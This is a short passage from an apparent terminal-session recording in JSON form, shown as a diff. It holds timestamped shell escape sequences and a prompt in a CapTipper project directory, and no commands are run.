+    [
+      0.002651,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                                        \r \r"
+    ],
+    [
+      0.000062,
+      "\u001b]2;omriher@Omris-MacBook-Pro: ~/Development/tmp_for_pres/CapTipper\u0007"
+    ],
+    [
+      0.000003,
+      "\u001b]1;..res/CapTipper\u0007"
+    ],
+    [
+      0.011854,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[01;32m➜ \u001b[01;32m \u001b[36mCapTipper \u001b[01;34m\u001b[01;34m \u001b[00m\u001b[K"
+    ],
+    [
+      0.000025,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      1.890809,
+      "\r\r\n"
+    ]
+  ]
+}
